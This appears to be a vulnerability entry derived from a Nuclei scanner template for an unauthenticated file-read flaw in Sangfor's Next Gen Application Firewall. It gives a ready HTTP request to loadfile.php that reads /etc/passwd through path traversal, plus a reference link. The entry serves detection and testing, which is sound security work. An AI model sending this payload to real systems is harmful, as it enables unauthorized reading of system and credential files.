# Nuclei Template: Sangfor Next Gen Application Firewall - Arbitary File Read
**Template ID:** sangfor-nextgen-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**Source:** Nuclei Template (`sangfor-ngaf-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Sangfor Next Gen Application Firewall is susceptible to Local File Inclusion as it does not validate the file parameter.

## Steps to reproduce / Exploit Payload
```http
GET /svpn_html/loadfile.php?file=/etc/./passwd HTTP/1.1
Host: {{Hostname}}
y-forwarded-for: 127.0.0.1
```

## References
- https://labs.watchtowr.com/yet-more-unauth-remote-command-execution-vulns-in-firewalls-sangfor-edition/
